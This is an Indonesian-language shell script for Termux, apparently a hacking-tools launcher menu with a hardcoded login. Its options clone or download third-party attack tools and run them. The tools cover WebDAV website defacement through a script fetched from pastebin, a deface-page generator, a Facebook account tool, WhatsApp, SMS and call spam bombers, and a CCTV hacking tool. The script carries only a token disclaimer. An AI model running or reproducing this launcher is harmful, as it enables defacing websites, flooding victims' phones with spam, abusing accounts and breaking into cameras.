clear
sleep 1
echo "\033[0;32m[+]WELCOME TO LOGIN PAGE[+]"
sleep 1
echo "untuk mendapatkan user dan pwnya silahkan Download"
sleep 1
echo "\033[0;32mLink:https://www.mediafire.com/download/i7jj6voddpqst9s"
sleep 3
echo ""
echo "[LOGIN]"
read -p "Username:" user;
if [ $user = MRROBO28 ]
then
echo ""
else
echo "Salah!!!"
sleep 1
echo "Silahkan ulang"
sleep 1
exit
fi
read -p "Password:" pw;
if [ $pw = toolsrobo28 ]
then
sleep 2
echo "Sucses Login"
sleep 3
else
echo "Salah!!!"
sleep 1
echo "silahkan ulang"
sleep 1
exit
fi
clear
sleep 3
toilet -f slant "MRROBO28" | lolcat
toilet -f slant "TOOLS" | lolcat
sleep 1
echo "\033[32;1m---------------------------------------------------------------------------"
sleep 1
echo "\033[0;36mAuthor:""\033[32;1mMR.ROBO.28"
sleep 1
echo "\033[0;36mgithub.com:""\033[32;1mhttps://github.com/MRROBO28"
sleep 1
echo "\033[0;36mInstagram:""\033[32;1m@irshad_faqih"
sleep 1
echo "\033[31;1mYouTube:""\033[32;1mTEKTRIBOT CN"
sleep 1
echo "\033[0;36mNote:""\033[31;1mJangan salah gunakan script ini dengan sembarangan.Karena Admin tidak bertanggung jawab!!!"
echo "\033[32;1m-----------------------------------------------------------------------"
sleep 3
echo "\033[1;33m                           [+]Macam-Macam Tools[+]"
sleep 1
echo "\033[0;36m[01]""\033[32;1mDeface Webdav"
echo "\033[0;36m[02]""\033[32;1mMembuat script Deface"
echo "\033[0;36m[03]""\033[32;1mDarkfb"
echo "\033[0;36m[04]""\033[32;1mSpamWA"
echo "\033[0;36m[05]""\033[32;1mSpamSMS"
echo "\033[0;36m[06]""\033[32;1mSpamCall"
echo "\033[0;36m[07]""\033[32;1mHackCCTV"
echo "\033[0;36m[00]""\033[32;1mExit"
read -p 'Masukkan pilihan Anda :' mrrm;
if [ $mrrm = 1 ] || [ $mrrm = 01 ]
then
clear
echo "\033[31;1mSedang download data..."
sleep 3
pip2 install urllib3 chardet certifi idna requests
apt install openssl curl -y
pkg install libcurl -y
clear
sleep 1
echo "\033[33;1m--++[TUTORIAL]++--"
sleep 1
echo "1.buat file baru di internal dengan nama webdav"
echo "2.taro sc kalian di folder webdav"
read -p 'Sudah Belum??[y/n]' pil0;
if [ $pil0 = n ]
then
echo "mengulang tools"
sleep 3
sh script.sh
fi
if [ $pil0 = y ]
then
echo "OK"
sleep 3
clear
cd /sdcard
cd webdav
curl -k -O https://pastebin.com/raw/HnVyQPtR
mv HnVyQPtR webdav.py
clear
sleep 3
echo "\033[33;1m--++[TUTORIAL WEBDAV]++--"
echo "\033[0;36mEx:""python2 webdav.py [webtarget.com] [sc.html]"
echo "sudah?[y/n]"
read pil
if [ $pil = y ]
then
echo "OK"
sleep 1
echo "silahkan tulis program :)"
$(which bash)
echo "silahkan tulis"
fi
fi
if [ $pil = n ]
then
echo "tools akan di tutup dalam waktu 8 detik..."
sleep 8
exit
fi
fi
if [ $mrrm = 2 ] || [ $mrrm = 02 ]
then
clear
echo "\033[0;36mMendownload data..."
sleep 2
cd $Home
cd Tools-robo28
git clone https://github.com/4L13199/LITESCRIPT
clear
cd LITESCRIPT
echo "\033[33;1m--++[TUTORIAL]++--"
echo "setelah jadi script deface tuliskan:"
echo "mv [nama script yg sudah jadi] /sdcard"
read -p "sudah??[y/n]" pil2;
fi
if [ $pil2 = n ]
then
echo "program ditutup"
sleep 3
exit
fi
if [ $pil2 = y ]
then
clear
python2 LITESCRIPT.py
fi
if [ $mrrm = 3 ] || [ $mrrm = 03 ]
then
clear
echo "\033[0;36mMendownload data..."
sleep 2
cd $Home
cd Tools-robo28
git clone https://github.com/storiku/darkfb
clear
cd darkfb
echo "\033[33;1m--++[TUTORIAL]++--"
echo "login ke akun facebook kamu untuk memberikan izin akses script."
echo "Login scriptnya dengan akun:"
echo "ID=Termux"
echo "PW=omaliptv"
read -p "Lanjut??[y/n]" pil3;
fi
if [ $pil3 = y ]
then
clear
python2 Dark.py
fi
if [ $pil3 = n ]
then
echo "Restart menu..."
cd $Home
cd Tools-robo28
sh script.sh
fi
if [ $mrrm = 4 ] || [ $mrrm = 04 ]
then
clear
echo "\033[32;1mSedang Download data..."
sleep 2
cd $Home
cd Tools-robo28
git clone https://github.com/storiku/spammerWA
clear
cd spammerWA
echo "\033[0;36m--++[TUTORIAL]++--"
sleep 2
echo "\033[0;36mNotes:""\033[32;1mGunakan script ini dengan bijak jangan salah gunakan karena Admin tidak bertanggung jawab"
echo "\033[32;1mUntuk login..."
sleep 1
echo "ID=Termux"
echo "PW=spamv1"
read -p "Lanjut?[y/n]" pil4;
fi
if [ $pil4 = y ]
then
echo "oke"
sleep 1
echo "script di mulai dalam 3 detik..."
sleep 3
python2 cwa.py
fi
if [ $pil4 = n ]
then
echo "Restart menu..."
cd $Home
cd Tools-robo28
sh script.sh
fi
if [ $mrrm = 5 ] || [ $mrrm = 05 ]
then
clear
echo "\033[32;1mSedang Download data ya...."
sleep 1
cd $home
cd Tools-robo28
git clone https://github.com/B4N954N2-ID/Brutal-Sms
clear
cd Brutal-Sms
sleep 1
echo "\033[0;36m--++[Notes]++--"
echo "\033[32;1mGunakan dengan bijak"
sleep 1
read -p "mulai[y/n]" pil5;
fi
if [ $pil5 = y ]
then
clear
python2 brutal.py
fi
if [ $pil5 = n ]
then
echo "Restart menu..."
cd $Home
cd Tools-robo28
sh script.sh
fi
if [ $mrrm = 6 ] || [ $mrrm = 06 ]
then
clear
echo "\033[32;1mSedang Download data ya...."
sleep 1
cd $home
cd Tools-robo28
git clone https://github.com/MRROBO28/spamCall
clear
sleep 1
echo "\033[32;1m[+]Tutorial[+]"
echo "[1]Sebelum mencantumkan nomor kalian harus memasukkan jumlah pengiriman spam yang akan dikirimkan."
echo "[2]Selanjutnya akan masuk ke nano editor yang sudah berisi kode. Tugas kalian adalah mencantumkan nomor penerima spam di editor tersebut."
echo "[3]Cari baris url dan masukkan nomor penerima di slash paling akhir."
read -p "mulai?[y/n]" pil6;
fi
if [ $pil6 = y ]
then
clear
sleep 2
cd spamCall
python call.py
fi
if [ $pil6 = n ]
then
echo "Restart menu..."
cd $Home
cd Tools-robo28
sh script.sh
fi
#HCCTV
if [ $mrrm = 7 ] || [ $mrrm = 07 ]
then
clear
echo "\033[32;1mSedang Download data ya...."
cd $home
cd Tools-robo28
git clone https://github.com/storiku/HackCCTV
cd HackCCTV
python2 HCCTV.py
fi
#EXUT
if [ $mrrm = 0 ] || [ $mrrm = 00 ]
then
clear
echo "\033[0;36mTHANKS FOR USED MY SCRIPT..."
sleep 1
echo "\033[32;1mGood bye..."
sleep 1
echo "program keluar dalam 3 detik"
sleep 3
exit
fi
